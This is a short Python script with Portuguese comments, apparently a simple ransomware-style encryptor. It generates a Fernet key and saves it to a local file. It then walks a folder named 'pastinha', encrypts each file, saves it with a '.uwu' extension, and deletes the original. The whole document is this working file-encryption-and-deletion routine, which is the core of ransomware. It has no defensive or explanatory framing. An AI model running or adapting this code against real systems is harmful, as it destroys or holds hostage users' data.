import os
from cryptography.fernet import Fernet

# Gerando uma chave e salvando
key = Fernet.generate_key()
with open('filekey.key', 'wb') as filekey:
    filekey.write(key)

# Criptografando os arquivos
for root, _, files in os.walk("./pastinha"):
    for file in files:
        
        filepath = os.path.join(root, file)
        with open(filepath, 'rb') as f:
            file_data = f.read()

        fernet = Fernet(key)
        encrypted_data = fernet.encrypt(file_data)

        # Salvando o arquivo criptografado com a extensão ".uwu"
        encrypted_filepath = os.path.splitext(filepath)[0] + ".uwu"
        with open(encrypted_filepath, 'wb') as f:
            f.write(encrypted_data)

        # Excluindo o arquivo original
        os.remove(filepath)
